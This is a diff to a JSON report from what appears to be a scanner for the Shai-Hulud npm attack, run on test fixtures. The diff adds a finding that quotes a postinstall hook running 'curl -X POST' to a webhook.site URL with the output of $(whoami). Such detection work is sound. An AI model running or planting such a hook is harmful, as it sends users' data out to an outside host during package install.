@@ -1,9 +1,9 @@
 {
   "scan_path": "../shai-hulud-detect/test-cases/infected-project/",
-  "start_time": "2025-09-28T07:48:57.024942200Z",
-  "end_time": "2025-09-28T07:48:57.108997900Z",
-  "duration_seconds": 0.084,
-  "timestamp": "2025-09-28T07:48:57.024942200Z",
+  "start_time": "2025-09-28T08:08:06.044606Z",
+  "end_time": "2025-09-28T08:08:06.121553300Z",
+  "duration_seconds": 0.076,
+  "timestamp": "2025-09-28T08:08:06.044606Z",
   "files_scanned": 0,
   "results": [
     {
@@ -130,6 +130,19 @@
       ]
     },
     {
+      "file": "../shai-hulud-detect/test-cases/infected-project/package-with-postinstall.json",
+      "risk_level": "High",
+      "comment": "Suspicious postinstall hook detected: curl -X POST https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7 -d $(whoami)",
+      "patterns_detected": [
+        "suspicious_postinstall_hook"
+      ],
+      "details": [
+        "Postinstall command: curl -X POST https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7 -d $(whoami)",
+        "Suspicious pattern: curl",
+        "Postinstall hooks can execute arbitrary code during package installation"
+      ]
+    },
+    {
       "file": "../shai-hulud-detect/test-cases/infected-project/crypto-theft.js",
       "risk_level": "High",
       "comment": "Cryptocurrency theft pattern: XMLHttpRequest prototype modification detected",
@@ -154,9 +167,9 @@
     }
   ],
   "summary": {
-    "high_risk_count": 8,
+    "high_risk_count": 9,
     "medium_risk_count": 2,
     "low_risk_count": 0,
-    "total_issues": 10
+    "total_issues": 11
   }
 }
